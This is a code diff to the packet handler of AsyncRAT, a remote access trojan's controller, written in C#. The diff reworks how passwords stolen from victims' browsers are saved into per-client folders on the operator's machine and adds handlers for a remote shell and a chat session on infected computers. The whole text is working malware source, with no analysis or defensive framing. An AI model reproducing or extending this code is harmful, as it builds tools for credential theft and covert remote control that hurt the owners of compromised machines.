@@ -62,10 +62,14 @@ namespace AsyncRAT_Sharp.Handle_Packet
 
                     case "recoveryPassword":
                         {
-                            if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID)))
-                                Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID));
-                            File.WriteAllText(Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\ChromePassowrds.txt"), unpack_msgpack.ForcePathObject("Password").AsString);
-                            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
+                            string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
+                            if (!Directory.Exists(fullPath))
+                                Directory.CreateDirectory(fullPath);
+                            File.WriteAllText(fullPath + "\\Passowrds.txt", unpack_msgpack.ForcePathObject("Password").AsString);
+                            if (File.ReadAllText(fullPath + "\\Passowrds.txt").Length > 23)
+                            {
+                                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
+                            }
                             break;
                         }
 
@@ -103,6 +107,18 @@ namespace AsyncRAT_Sharp.Handle_Packet
                     case "fileManager":
                         {
                             new HandleFileManager().FileManager(client, unpack_msgpack);
+                            break;
+                        }
+
+                    case "shell":
+                        {
+                            new HandleShell(unpack_msgpack, client);
+                            break;
+                        }
+
+                    case "chat":
+                        {
+                            new HandleChat(unpack_msgpack, client);
                             break;
                         }
                 }
